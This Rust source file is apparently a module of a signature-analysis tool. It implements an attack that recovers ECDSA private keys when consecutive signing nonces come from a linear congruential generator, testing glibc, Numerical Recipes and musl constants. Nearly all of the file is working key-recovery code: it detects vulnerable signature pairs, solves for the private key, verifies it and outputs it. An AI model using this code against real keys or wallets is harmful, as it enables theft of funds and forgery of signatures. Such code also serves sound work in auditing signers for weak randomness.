use super::*;
use crate::math::{scalar_to_decimal_string, mod_inverse, verify_private_key};

pub struct LcgAttack;

impl Attack for LcgAttack {
    fn name(&self) -> &'static str {
        "lcg"
    }

    fn min_signatures(&self) -> usize {
        2
    }

    fn detect(&self, signatures: &[Signature]) -> Vec<Vulnerability> {
        let mut vulns = Vec::new();

        let mut by_pubkey: std::collections::HashMap<Option<String>, Vec<Signature>> = std::collections::HashMap::new();
        for sig in signatures {
            by_pubkey.entry(sig.pubkey.clone()).or_default().push(sig.clone());
        }

        for (pubkey, sigs) in by_pubkey {
            if sigs.len() < 2 { continue; }

            for i in 0..sigs.len() - 1 {
                if let Some(_key) = try_recover_lcg(&sigs[i], &sigs[i+1], &pubkey) {
                    let group = SignatureGroup {
                        r: sigs[i].r,
                        pubkey: pubkey.clone(),
                        signatures: vec![sigs[i].clone(), sigs[i+1].clone()],
                        confidence: 1.0,
                    };
                    vulns.push(Vulnerability {
                        attack_type: self.name().to_string(),
                        group,
                    });
                }
            }
        }

        vulns
    }

    fn recover(&self, vuln: &Vulnerability) -> Option<RecoveredKey> {
        let sigs = &vuln.group.signatures;
        if sigs.len() < 2 { return None; }
        try_recover_lcg(&sigs[0], &sigs[1], &vuln.group.pubkey)
    }
}

fn try_recover_lcg(sig1: &Signature, sig2: &Signature, pubkey: &Option<String>) -> Option<RecoveredKey> {
    let params = [
        // glibc
        (Scalar::from(1103515245u64), Scalar::from(12345u64)),
        // Numerical Recipes
        (Scalar::from(1664525u64), Scalar::from(1013904223u64)),
        // Musl
        (Scalar::from(6364136223846793005u64), Scalar::from(1u64)),
    ];

    for (a, c) in params {
        if let Some(priv_key) = solve_lcg_relationship(sig1, sig2, a, c) {
            return Some(RecoveredKey {
                private_key: priv_key,
                private_key_decimal: scalar_to_decimal_string(&priv_key),
                pubkey: pubkey.clone(),
            });
        }
    }

    None
}

fn solve_lcg_relationship(sig1: &Signature, sig2: &Signature, a: Scalar, c: Scalar) -> Option<Scalar> {
    let s1_inv = mod_inverse(&sig1.s)?;
    let s2_inv = mod_inverse(&sig2.s)?;

    let term1 = s2_inv * sig2.r;
    let term2 = a * s1_inv * sig1.r;
    let lhs = term1 - term2;

    let term3 = a * s1_inv * sig1.z;
    let rhs = term3 + c - (s2_inv * sig2.z);

    if bool::from(lhs.is_zero()) { return None; }
    let x = rhs * mod_inverse(&lhs)?;

    if verify_private_key(&x, &sig1.r, &sig1.s, &sig1.z, &sig1.pubkey) { return Some(x); }

    None
}
